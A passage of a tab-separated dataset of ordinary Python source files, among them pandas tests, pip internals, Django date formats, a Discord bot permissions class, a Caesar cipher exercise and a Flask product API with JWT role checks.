        user = users.get_current_user()
        if user:
            if users.is_current_user_admin():
                self.response.write('You are an administrator.')
            else:
                self.response.write('You are not an administrator.')
        else:
            self.response.write('You are not logged in.')


app = webapp2.WSGIApplication([
    ('/', MainPage),
    ('/admin', AdminPage)
], debug=True)

# [END all]"
JD513	JD513-test_searchsorted.py	"import numpy as np

from pandas import (
    Series,
    Timestamp,
    date_range,
)
import pandas._testing as tm
from pandas.api.types import is_scalar


class TestSeriesSearchSorted:
    def test_searchsorted(self):
        ser = Series([1, 2, 3])

        result = ser.searchsorted(1, side=""left"")
        assert is_scalar(result)
        assert result == 0

        result = ser.searchsorted(1, side=""right"")
        assert is_scalar(result)
        assert result == 1

    def test_searchsorted_numeric_dtypes_scalar(self):
        ser = Series([1, 2, 90, 1000, 3e9])
        res = ser.searchsorted(30)
        assert is_scalar(res)
        assert res == 2

        res = ser.searchsorted([30])
        exp = np.array([2], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)

    def test_searchsorted_numeric_dtypes_vector(self):
        ser = Series([1, 2, 90, 1000, 3e9])
        res = ser.searchsorted([91, 2e6])
        exp = np.array([3, 4], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)

    def test_searchsorted_datetime64_scalar(self):
        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))
        val = Timestamp(""20120102"")
        res = ser.searchsorted(val)
        assert is_scalar(res)
        assert res == 1

    def test_searchsorted_datetime64_scalar_mixed_timezones(self):
        # GH 30086
        ser = Series(date_range(""20120101"", periods=10, freq=""2D"", tz=""UTC""))
        val = Timestamp(""20120102"", tz=""America/New_York"")
        res = ser.searchsorted(val)
        assert is_scalar(res)
        assert res == 1

    def test_searchsorted_datetime64_list(self):
        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))
        vals = [Timestamp(""20120102""), Timestamp(""20120104"")]
        res = ser.searchsorted(vals)
        exp = np.array([1, 2], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)

    def test_searchsorted_sorter(self):
        # GH8490
        ser = Series([3, 1, 2])
        res = ser.searchsorted([0, 3], sorter=np.argsort(ser))
        exp = np.array([0, 2], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)"
JY462	JY462-test_copy.py	"import numpy as np
import pytest

import pandas.util._test_decorators as td

from pandas import DataFrame
import pandas._testing as tm


class TestCopy:
    @pytest.mark.parametrize(""attr"", [""index"", ""columns""])
    def test_copy_index_name_checking(self, float_frame, attr):
        # don't want to be able to modify the index stored elsewhere after
        # making a copy
        ind = getattr(float_frame, attr)
        ind.name = None
        cp = float_frame.copy()
        getattr(cp, attr).name = ""foo""
        assert getattr(float_frame, attr).name is None

    def test_copy_cache(self):
        # GH#31784 _item_cache not cleared on copy causes incorrect reads after updates
        df = DataFrame({""a"": [1]})

        df[""x""] = [0]
        df[""a""]

        df.copy()

        df[""a""].values[0] = -1

        tm.assert_frame_equal(df, DataFrame({""a"": [-1], ""x"": [0]}))

        df[""y""] = [0]

        assert df[""a""].values[0] == -1
        tm.assert_frame_equal(df, DataFrame({""a"": [-1], ""x"": [0], ""y"": [0]}))

    def test_copy(self, float_frame, float_string_frame):
        cop = float_frame.copy()
        cop[""E""] = cop[""A""]
        assert ""E"" not in float_frame

        # copy objects
        copy = float_string_frame.copy()
        assert copy._mgr is not float_string_frame._mgr

    @td.skip_array_manager_invalid_test
    def test_copy_consolidates(self):
        # GH#42477
        df = DataFrame(
            {
                ""a"": np.random.randint(0, 100, size=55),
                ""b"": np.random.randint(0, 100, size=55),
            }
        )

        for i in range(0, 10):
            df.loc[:, f""n_{i}""] = np.random.randint(0, 100, size=55)

        assert len(df._mgr.blocks) == 11
        result = df.copy()
        assert len(result._mgr.blocks) == 1"
JD304	JD304-packaging.py	"import functools
import logging
import re
from typing import NewType, Optional, Tuple, cast

from pip._vendor.packaging import specifiers, version
from pip._vendor.packaging.requirements import Requirement

NormalizedExtra = NewType(""NormalizedExtra"", str)

logger = logging.getLogger(__name__)


def check_requires_python(
    requires_python: Optional[str], version_info: Tuple[int, ...]
) -> bool:
    """"""
    Check if the given Python version matches a ""Requires-Python"" specifier.

    :param version_info: A 3-tuple of ints representing a Python
        major-minor-micro version to check (e.g. `sys.version_info[:3]`).

    :return: `True` if the given Python version satisfies the requirement.
        Otherwise, return `False`.

    :raises InvalidSpecifier: If `requires_python` has an invalid format.
    """"""
    if requires_python is None:
        # The package provides no information
        return True
    requires_python_specifier = specifiers.SpecifierSet(requires_python)

    python_version = version.parse(""."".join(map(str, version_info)))
    return python_version in requires_python_specifier


@functools.lru_cache(maxsize=512)
def get_requirement(req_string: str) -> Requirement:
    """"""Construct a packaging.Requirement object with caching""""""
    # Parsing requirement strings is expensive, and is also expected to happen
    # with a low diversity of different arguments (at least relative the number
    # constructed). This method adds a cache to requirement object creation to
    # minimize repeated parsing of the same string to construct equivalent
    # Requirement objects.
    return Requirement(req_string)


def safe_extra(extra: str) -> NormalizedExtra:
    """"""Convert an arbitrary string to a standard 'extra' name

    Any runs of non-alphanumeric characters are replaced with a single '_',
    and the result is always lowercased.

    This function is duplicated from ``pkg_resources``. Note that this is not
    the same to either ``canonicalize_name`` or ``_egg_link_name``.
    """"""
    return cast(NormalizedExtra, re.sub(""[^A-Za-z0-9.-]+"", ""_"", extra).lower())"
JD297	JD297-drawing_constants.py	"import cairo
from color import Color, palette
import numpy as np


def set_color(cr, color, a=1):
    if color.a == 1.0:
        cr.set_source_rgba(color.r, color.g, color.b, a)
    else:
        cr.set_source_rgba(color.r, color.g, color.b, color.a)


def draw_px_cross(cr, x, y, length_px, color=palette[""RED""]):
    """"""Draws a cross with fixed dimensions in pixel space.""""""
    set_color(cr, color)
    cr.move_to(x, y - length_px)
    cr.line_to(x, y + length_px)
    cr.stroke()

    cr.move_to(x - length_px, y)
    cr.line_to(x + length_px, y)
    cr.stroke()
    set_color(cr, palette[""WHITE""])


def draw_px_x(cr, x, y, length_px1, color=palette[""BLACK""]):
    """"""Draws a x with fixed dimensions in pixel space.""""""
    length_px = length_px1 / np.sqrt(2)
    set_color(cr, color)
    cr.move_to(x - length_px, y - length_px)
    cr.line_to(x + length_px, y + length_px)
    cr.stroke()

    cr.move_to(x - length_px, y + length_px)
    cr.line_to(x + length_px, y - length_px)
    cr.stroke()
    set_color(cr, palette[""WHITE""])


def draw_circle(cr, x, y, radius, color=palette[""RED""]):
    set_color(cr, color)
    cr.arc(x, y, radius, 0, 2 * np.pi)
    cr.fill()
    cr.stroke()


def draw_control_points_cross(cr,
                              points,
                              width=10,
                              radius=4,
                              color=palette[""BLUE""]):
    for i in range(0, len(points)):
        draw_px_x(cr, points[i][0], points[i][1], width, color)
        set_color(cr, color)
        cr.arc(points[i][0], points[i][1], radius, 0, 2.0 * np.pi)
        cr.fill()
        set_color(cr, palette[""WHITE""])


def display_text(cr, text, widtha, heighta, widthb, heightb):
    cr.scale(widtha, -heighta)
    cr.show_text(text)
    cr.scale(widthb, -heightb)


def draw_points(cr, p, size):
    for i in range(0, len(p)):
        draw_px_cross(cr, p[i][0], p[i][1], size,
                      Color(0, np.sqrt(0.2 * i), 0))"
JY134	JY134-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j. E Y.'
TIME_FORMAT = 'H:i'
DATETIME_FORMAT = 'j. E Y. H:i'
YEAR_MONTH_FORMAT = 'F Y.'
MONTH_DAY_FORMAT = 'j. F'
SHORT_DATE_FORMAT = 'j.m.Y.'
SHORT_DATETIME_FORMAT = 'j.m.Y. H:i'
FIRST_DAY_OF_WEEK = 1

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d',                     # '2006-10-25'
    '%d.%m.%Y.', '%d.%m.%y.',       # '25.10.2006.', '25.10.06.'
    '%d. %m. %Y.', '%d. %m. %y.',   # '25. 10. 2006.', '25. 10. 06.'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',        # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',     # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',           # '2006-10-25 14:30'
    '%d.%m.%Y. %H:%M:%S',       # '25.10.2006. 14:30:59'
    '%d.%m.%Y. %H:%M:%S.%f',    # '25.10.2006. 14:30:59.000200'
    '%d.%m.%Y. %H:%M',          # '25.10.2006. 14:30'
    '%d.%m.%y. %H:%M:%S',       # '25.10.06. 14:30:59'
    '%d.%m.%y. %H:%M:%S.%f',    # '25.10.06. 14:30:59.000200'
    '%d.%m.%y. %H:%M',          # '25.10.06. 14:30'
    '%d. %m. %Y. %H:%M:%S',     # '25. 10. 2006. 14:30:59'
    '%d. %m. %Y. %H:%M:%S.%f',  # '25. 10. 2006. 14:30:59.000200'
    '%d. %m. %Y. %H:%M',        # '25. 10. 2006. 14:30'
    '%d. %m. %y. %H:%M:%S',     # '25. 10. 06. 14:30:59'
    '%d. %m. %y. %H:%M:%S.%f',  # '25. 10. 06. 14:30:59.000200'
    '%d. %m. %y. %H:%M',        # '25. 10. 06. 14:30'
]

DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JD250	JD250-Permissions.py	"import discord

class Permissions:
    def __init__(self,
                 mods: list[int] = [],
                 admins: list[int] = []):

        self.mods = set(mods)
        self.admins = set(admins)

    def __call__(self, ctx):
        command = str(ctx.command)
        uid = ctx.author.id

        if uid in self.admins:
            return True

        admin_only = ['bot', 'permissions', 'job']
        if uid in self.mods and command not in admin_only:
            return True

        return False

    def setup(self, genbot):
        group = genbot.create_group('permissions', 'Manages command permissions')

        @group.command(description='Gives moderation permissions')
        async def promote(ctx, user: discord.User):
            if user.id in self.admins:
                await ctx.respond(f'{user.name}#{user.discriminator} is an admin.')
                return
            elif user.id in self.mods:
                await ctx.respond(f'{user.name}#{user.discriminator} is already a mod.')
                return
            else:
                self.mods.add(user.id)
                await ctx.respond(f'{user.name}#{user.discriminator} is now a mod.')

        @group.command(description='Takes away moderation permissions')
        async def demote(ctx, user: discord.User):
            if user.id in self.admins:
                await ctx.respond(f'{user.name}#{user.discriminator} is an admin.')
                return
            elif user.id not in self.mods:
                await ctx.respond(f'{user.name}#{user.discriminator} is not a mod.')
                return
            else:
                self.mods.remove(user.id)
                await ctx.respond(f'{user.name}#{user.discriminator} is no longer a mod.')

        @group.error
        async def error_fn(ctx, error):
            await ctx.respond('Permission not granted.')"
JY245	JY245-expression.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
#
from typing import Optional, Union

import viktor._vendor.libcst as cst


def get_full_name_for_node(node: Union[str, cst.CSTNode]) -> Optional[str]:
    """"""Return a dot concatenated full name for str, :class:`~libcst.Name`, :class:`~libcst.Attribute`.
    :class:`~libcst.Call`, :class:`~libcst.Subscript`, :class:`~libcst.FunctionDef`, :class:`~libcst.ClassDef`,
    :class:`~libcst.Decorator`.
    Return ``None`` for not supported Node.
    """"""
    if isinstance(node, cst.Name):
        return node.value
    elif isinstance(node, str):
        return node
    elif isinstance(node, cst.Attribute):
        return f""{get_full_name_for_node(node.value)}.{node.attr.value}""
    elif isinstance(node, cst.Call):
        return get_full_name_for_node(node.func)
    elif isinstance(node, cst.Subscript):
        return get_full_name_for_node(node.value)
    elif isinstance(node, (cst.FunctionDef, cst.ClassDef)):
        return get_full_name_for_node(node.name)
    elif isinstance(node, cst.Decorator):
        return get_full_name_for_node(node.decorator)
    return None


def get_full_name_for_node_or_raise(node: Union[str, cst.CSTNode]) -> str:
    """"""Return a dot concatenated full name for str, :class:`~libcst.Name`, :class:`~libcst.Attribute`.
    :class:`~libcst.Call`, :class:`~libcst.Subscript`, :class:`~libcst.FunctionDef`, :class:`~libcst.ClassDef`.
    Raise Exception for not supported Node.
    """"""
    full_name = get_full_name_for_node(node)
    if full_name is None:
        raise Exception(f""Not able to parse full name for: {node}"")
    return full_name"
JY300	JY300-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""sankey.link"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY58	JY58-_compat.py	"import importlib.metadata
from typing import Any, Optional, Protocol, cast


class BadMetadata(ValueError):
    def __init__(self, dist: importlib.metadata.Distribution, *, reason: str) -> None:
        self.dist = dist
        self.reason = reason

    def __str__(self) -> str:
        return f""Bad metadata in {self.dist} ({self.reason})""


class BasePath(Protocol):
    """"""A protocol that various path objects conform.

    This exists because importlib.metadata uses both ``pathlib.Path`` and
    ``zipfile.Path``, and we need a common base for type hints (Union does not
    work well since ``zipfile.Path`` is too new for our linter setup).

    This does not mean to be exhaustive, but only contains things that present
    in both classes *that we need*.
    """"""

    @property
    def name(self) -> str:
        raise NotImplementedError()

    @property
    def parent(self) -> ""BasePath"":
        raise NotImplementedError()


def get_info_location(d: importlib.metadata.Distribution) -> Optional[BasePath]:
    """"""Find the path to the distribution's metadata directory.

    HACK: This relies on importlib.metadata's private ``_path`` attribute. Not
    all distributions exist on disk, so importlib.metadata is correct to not
    expose the attribute as public. But pip's code base is old and not as clean,
    so we do this to avoid having to rewrite too many things. Hopefully we can
    eliminate this some day.
    """"""
    return getattr(d, ""_path"", None)


def get_dist_name(dist: importlib.metadata.Distribution) -> str:
    """"""Get the distribution's project name.

    The ``name`` attribute is only available in Python 3.10 or later. We are
    targeting exactly that, but Mypy does not know this.
    """"""
    name = cast(Any, dist).name
    if not isinstance(name, str):
        raise BadMetadata(dist, reason=""invalid metadata entry 'name'"")
    return name"
JY63	JY63-progress_bars.py	"import functools
from typing import Callable, Generator, Iterable, Iterator, Optional, Tuple

from pip._vendor.rich.progress import (
    BarColumn,
    DownloadColumn,
    FileSizeColumn,
    Progress,
    ProgressColumn,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
    TransferSpeedColumn,
)

from pip._internal.utils.logging import get_indentation

DownloadProgressRenderer = Callable[[Iterable[bytes]], Iterator[bytes]]


def _rich_progress_bar(
    iterable: Iterable[bytes],
    *,
    bar_type: str,
    size: int,
) -> Generator[bytes, None, None]:
    assert bar_type == ""on"", ""This should only be used in the default mode.""

    if not size:
        total = float(""inf"")
        columns: Tuple[ProgressColumn, ...] = (
            TextColumn(""[progress.description]{task.description}""),
            SpinnerColumn(""line"", speed=1.5),
            FileSizeColumn(),
            TransferSpeedColumn(),
            TimeElapsedColumn(),
        )
    else:
        total = size
        columns = (
            TextColumn(""[progress.description]{task.description}""),
            BarColumn(),
            DownloadColumn(),
            TransferSpeedColumn(),
            TextColumn(""eta""),
            TimeRemainingColumn(),
        )

    progress = Progress(*columns, refresh_per_second=30)
    task_id = progress.add_task("" "" * (get_indentation() + 2), total=total)
    with progress:
        for chunk in iterable:
            yield chunk
            progress.update(task_id, advance=len(chunk))


def get_download_progress_renderer(
    *, bar_type: str, size: Optional[int] = None
) -> DownloadProgressRenderer:
    """"""Get an object that can be used to render the download progress.

    Returns a callable, that takes an iterable to ""wrap"".
    """"""
    if bar_type == ""on"":
        return functools.partial(_rich_progress_bar, bar_type=bar_type, size=size)
    else:
        return iter  # no-op, when passed an iterator"
JD190	JD190-perldoc.py	"""""""
    pygments.styles.perldoc
    ~~~~~~~~~~~~~~~~~~~~~~~

    Style similar to the style used in the `perldoc`_ code blocks.

    .. _perldoc: http://perldoc.perl.org/

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class PerldocStyle(Style):
    """"""
    Style similar to the style used in the perldoc code blocks.
    """"""

    background_color = '#eeeedd'

    styles = {
        Whitespace:             '#bbbbbb',
        Comment:                '#228B22',
        Comment.Preproc:        '#1e889b',
        Comment.Special:        '#8B008B bold',

        String:                 '#CD5555',
        String.Heredoc:         '#1c7e71 italic',
        String.Regex:           '#B452CD',
        String.Other:           '#cb6c20',
        String.Regex:           '#1c7e71',

        Number:                 '#B452CD',

        Operator.Word:          '#8B008B',

        Keyword:                '#8B008B bold',
        Keyword.Type:           '#00688B',

        Name.Class:             '#008b45 bold',
        Name.Exception:         '#008b45 bold',
        Name.Function:          '#008b45',
        Name.Namespace:         '#008b45 underline',
        Name.Variable:          '#00688B',
        Name.Constant:          '#00688B',
        Name.Decorator:         '#707a7c',
        Name.Tag:               '#8B008B bold',
        Name.Attribute:         '#658b00',
        Name.Builtin:           '#658b00',

        Generic.Heading:        'bold #000080',
        Generic.Subheading:     'bold #800080',
        Generic.Deleted:        '#aa0000',
        Generic.Inserted:       '#00aa00',
        Generic.Error:          '#aa0000',
        Generic.Emph:           'italic',
        Generic.Strong:         'bold',
        Generic.Prompt:         '#555555',
        Generic.Output:         '#888888',
        Generic.Traceback:      '#aa0000',

        Error:                  'bg:#e3d2d2 #a61717'
    }"
JD376	JD376-day8_86_caesarcipher.py	"from hashlib import new
from re import A


alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

direction = input(""Type 'encode' to encrypt, type 'decode' to decrypt:\n"")
text = input(""Type your message:\n"").lower()
shift = int(input(""Type the shift number:\n""))


def encrypt(text,shift):
    cipher_text = """"

    for letter in text:
        index = alphabet.index(letter)  
        
        new_index = index+shift

        cipher_text = cipher_text + alphabet[new_index]
    
    print(f""The encoded text is {cipher_text}."")

    #TODO-1: Create a different function called 'decrypt' that takes the 'text' and 'shift' as inputs.

def decrypt(text,shift):


  #TODO-2: Inside the 'decrypt' function, shift each letter of the 'text' *backwards* in the alphabet by the shift amount and print the decrypted text.  
  #e.g. 
  #cipher_text = ""mjqqt""
  #shift = 5
  #plain_text = ""hello""
  #print output: ""The decoded text is hello""

    cipher_text = """"

    for letter in text:
        index = alphabet.index(letter)

        shift = -abs(shift)  
        
        new_index = index+shift

        cipher_text = cipher_text + alphabet[new_index]
    
    print(f""The decode text is {cipher_text}."")

#TODO-3: Check if the user wanted to encrypt or decrypt the message by checking the 'direction' variable. Then call the correct function based on that 'drection' variable. You should be able to test the code to encrypt *AND* decrypt a message.

if direction == ""encode"":
    encrypt(text,shift)
elif direction == ""decode"":
    decrypt(text,shift)
else:
    print(""Please try encrypt or decrypt"")"
JD85	JD85-log.py	"""""""A simple log mechanism styled after PEP 282.""""""

# The class here is styled after PEP 282 so that it could later be
# replaced with a standard Python logging implementation.

import sys

DEBUG = 1
INFO = 2
WARN = 3
ERROR = 4
FATAL = 5


class Log:
    def __init__(self, threshold=WARN):
        self.threshold = threshold

    def _log(self, level, msg, args):
        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):
            raise ValueError('%s wrong log level' % str(level))

        if level >= self.threshold:
            if args:
                msg = msg % args
            if level in (WARN, ERROR, FATAL):
                stream = sys.stderr
            else:
                stream = sys.stdout
            try:
                stream.write('%s\n' % msg)
            except UnicodeEncodeError:
                # emulate backslashreplace error handler
                encoding = stream.encoding
                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)
                stream.write('%s\n' % msg)
            stream.flush()

    def log(self, level, msg, *args):
        self._log(level, msg, args)

    def debug(self, msg, *args):
        self._log(DEBUG, msg, args)

    def info(self, msg, *args):
        self._log(INFO, msg, args)

    def warn(self, msg, *args):
        self._log(WARN, msg, args)

    def error(self, msg, *args):
        self._log(ERROR, msg, args)

    def fatal(self, msg, *args):
        self._log(FATAL, msg, args)


_global_log = Log()
log = _global_log.log
debug = _global_log.debug
info = _global_log.info
warn = _global_log.warn
error = _global_log.error
fatal = _global_log.fatal


def set_threshold(level):
    # return the old threshold for use from tests
    old = _global_log.threshold
    _global_log.threshold = level
    return old


def set_verbosity(v):
    if v <= 0:
        set_threshold(WARN)
    elif v == 1:
        set_threshold(INFO)
    elif v >= 2:
        set_threshold(DEBUG)"
JD193	JD193-_export_format.py	"CONSOLE_HTML_FORMAT = """"""\
<!DOCTYPE html>
<head>
<meta charset=""UTF-8"">
<style>
{stylesheet}
body {{
    color: {foreground};
    background-color: {background};
}}
</style>
</head>
<html>
<body>
    <pre style=""font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace""><code>{code}</code></pre>
</body>
</html>
""""""

CONSOLE_SVG_FORMAT = """"""\
<svg class=""rich-terminal"" viewBox=""0 0 {width} {height}"" xmlns=""http://www.w3.org/2000/svg"">
    <!-- Generated with Rich https://www.textualize.io -->
    <style>

    @font-face {{
        font-family: ""Fira Code"";
        src: local(""FiraCode-Regular""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Regular.woff2"") format(""woff2""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Regular.woff"") format(""woff"");
        font-style: normal;
        font-weight: 400;
    }}
    @font-face {{
        font-family: ""Fira Code"";
        src: local(""FiraCode-Bold""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Bold.woff2"") format(""woff2""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Bold.woff"") format(""woff"");
        font-style: bold;
        font-weight: 700;
    }}

    .{unique_id}-matrix {{
        font-family: Fira Code, monospace;
        font-size: {char_height}px;
        line-height: {line_height}px;
        font-variant-east-asian: full-width;
    }}

    .{unique_id}-title {{
        font-size: 18px;
        font-weight: bold;
        font-family: arial;
    }}

    {styles}
    </style>

    <defs>
    <clipPath id=""{unique_id}-clip-terminal"">
      <rect x=""0"" y=""0"" width=""{terminal_width}"" height=""{terminal_height}"" />
    </clipPath>
    {lines}
    </defs>

    {chrome}
    <g transform=""translate({terminal_x}, {terminal_y})"" clip-path=""url(#{unique_id}-clip-terminal)"">
    {backgrounds}
    <g class=""{unique_id}-matrix"">
    {matrix}
    </g>
    </g>
</svg>
""""""

_SVG_FONT_FAMILY = ""Rich Fira Code""
_SVG_CLASSES_PREFIX = ""rich-svg"""
JD62	JD62-(Medium) 1129. Shortest Path with Alternating Colors.py	"from collections import defaultdict, deque


class Solution(object):
    def shortestAlternatingPaths(self, n, redEdges, blueEdges):
        """"""
        :type n: int
        :type redEdges: List[List[int]]
        :type blueEdges: List[List[int]]
        :rtype: List[int]
        """"""
        graph = defaultdict(list)
        red = defaultdict(lambda: False)
        blue = defaultdict(lambda: False)
        visited = defaultdict(lambda: False)
        res = [10**9]*n
        res[0] = 0
        for u, v in redEdges:
            red[(u, v)] = True
            graph[u].append(v)
        for u, v in blueEdges:
            blue[(u, v)] = True
            graph[u].append(v)
        queue = deque()

        # -1: red
        # 0: whatever
        # 1: blue
        # current node, previous edge 's color, maxDistance
        queue.append((0, 0, 0))
        while queue:
            u, c, d = queue.popleft()
            for v in graph[u]:
                if visited[(u, v, c)] == False:
                    if c == 0:  # whatever
                        if red[(u, v)] and blue[(u, v)]:
                            color = 0
                        elif red[(u, v)] and not blue[(u, v)]:
                            color = -1
                        elif not red[(u, v)] and blue[(u, v)]:
                            color = 1
                        queue.append((v, color, d+1))
                        res[v] = min(res[v], d+1)
                        visited[(u, v, c)] = True
                    elif c == -1 and blue[(u, v)]:
                        queue.append((v, 1, d+1))
                        res[v] = min(res[v], d+1)
                        visited[(u, v, c)] = True
                    elif c == 1 and red[(u, v)]:
                        queue.append((v, -1, d+1))
                        res[v] = min(res[v], d+1)
                        visited[(u, v, c)] = True
        for i in range(n):
            if res[i] == 10**9:
                res[i] = -1
        return res


t = Solution()
# t.shortestAlternatingPaths(5, [[0, 1], [1, 2], [2, 3], [3, 4]], [
#                            [1, 2], [2, 3], [3, 1]])
t.shortestAlternatingPaths(3, [[0, 1], [0, 2]], [[1, 0]])"
JY388	JY388-cli.py	"from __future__ import unicode_literals

# For backwards-compatibility. keep this file.
# (Many people are going to have key bindings that rely on this file.)
from .app import *

__all__ = [
    # Old names.
    'HasArg',
    'HasCompletions',
    'HasFocus',
    'HasSelection',
    'HasValidationError',
    'IsDone',
    'IsReadOnly',
    'IsMultiline',
    'RendererHeightIsKnown',
    'InEditingMode',
    'InPasteMode',

    'ViMode',
    'ViNavigationMode',
    'ViInsertMode',
    'ViInsertMultipleMode',
    'ViReplaceMode',
    'ViSelectionMode',
    'ViWaitingForTextObjectMode',
    'ViDigraphMode',

    'EmacsMode',
    'EmacsInsertMode',
    'EmacsSelectionMode',

    'IsSearching',
    'HasSearch',
    'ControlIsSearchable',
]

# Keep the original classnames for backwards compatibility.
HasValidationError = lambda: has_validation_error
HasArg = lambda: has_arg
IsDone = lambda: is_done
RendererHeightIsKnown = lambda: renderer_height_is_known
ViNavigationMode = lambda: vi_navigation_mode
InPasteMode = lambda: in_paste_mode
EmacsMode = lambda: emacs_mode
EmacsInsertMode = lambda: emacs_insert_mode
ViMode = lambda: vi_mode
IsSearching = lambda: is_searching
HasSearch = lambda: is_searching
ControlIsSearchable = lambda: control_is_searchable
EmacsSelectionMode = lambda: emacs_selection_mode
ViDigraphMode = lambda: vi_digraph_mode
ViWaitingForTextObjectMode = lambda: vi_waiting_for_text_object_mode
ViSelectionMode = lambda: vi_selection_mode
ViReplaceMode = lambda: vi_replace_mode
ViInsertMultipleMode = lambda: vi_insert_multiple_mode
ViInsertMode = lambda: vi_insert_mode
HasSelection = lambda: has_selection
HasCompletions = lambda: has_completions
IsReadOnly = lambda: is_read_only
IsMultiline = lambda: is_multiline

HasFocus = has_focus  # No lambda here! (Has_focus is callable that returns a callable.)
InEditingMode = in_editing_mode"
JD409	JD409-ImageSequence.py	"#
# The Python Imaging Library.
# $Id$
#
# sequence support classes
#
# history:
# 1997-02-20 fl     Created
#
# Copyright (c) 1997 by Secret Labs AB.
# Copyright (c) 1997 by Fredrik Lundh.
#
# See the README file for information on usage and redistribution.
#

##


class Iterator:
    """"""
    This class implements an iterator object that can be used to loop
    over an image sequence.

    You can use the ``[]`` operator to access elements by index. This operator
    will raise an :py:exc:`IndexError` if you try to access a nonexistent
    frame.

    :param im: An image object.
    """"""

    def __init__(self, im):
        if not hasattr(im, ""seek""):
            msg = ""im must have seek method""
            raise AttributeError(msg)
        self.im = im
        self.position = getattr(self.im, ""_min_frame"", 0)

    def __getitem__(self, ix):
        try:
            self.im.seek(ix)
            return self.im
        except EOFError as e:
            raise IndexError from e  # end of sequence

    def __iter__(self):
        return self

    def __next__(self):
        try:
            self.im.seek(self.position)
            self.position += 1
            return self.im
        except EOFError as e:
            raise StopIteration from e


def all_frames(im, func=None):
    """"""
    Applies a given function to all frames in an image or a list of images.
    The frames are returned as a list of separate images.

    :param im: An image, or a list of images.
    :param func: The function to apply to all of the image frames.
    :returns: A list of images.
    """"""
    if not isinstance(im, list):
        im = [im]

    ims = []
    for imSequence in im:
        current = imSequence.tell()

        ims += [im_frame.copy() for im_frame in Iterator(imSequence)]

        imSequence.seek(current)
    return [func(im) for im in ims] if func else ims"
JD468	JD468-products_controller.py	"from flask import Blueprint, request
from model.product import Product
from schema.products_schema import products_schema, product_schema
from app import db
from flask_jwt_extended import jwt_required,  get_jwt


product = Blueprint('product', __name__, url_prefix='/products')


@product.get(""/"")
@jwt_required()
def get_products():
    current_user_claims = get_jwt()
    user_role = current_user_claims.get('role')
    if user_role == ""lab"":
        products = Product.query.all()
        return products_schema.dump(products)
    else:
        return {""message"": ""You do not have authorization to view all product information.""}, 403


@product.get(""/<int:id>"")
@jwt_required()
def get_product(id):
    product = Product.query.get(id)
    current_user_claims = get_jwt()
    user_role = current_user_claims.get('role')
    if user_role == ""lab"":
        if product:
            return product_schema.dump(product)
        else:
            return {""message"": ""This product does not exist.""}, 403
    else:
        return {""message"": ""You do not have authorization to view product information.""}, 403


@product.post(""/"")
@jwt_required()
def create_product():
    current_user_claims = get_jwt()
    user_role = current_user_claims.get('role')
    if user_role != ""lab"":
        return {""message"": ""You are not authorized to create a product.""}, 403
    else:
        product_fields = product_schema.load(request.json)
        product = Product(**product_fields)
        db.session.add(product)
        db.session.commit()
        return {""result"": product_schema.dump(product)}


@product.delete(""/<int:id>"")
@jwt_required()
def delete_product(id):
    current_user_claims = get_jwt()
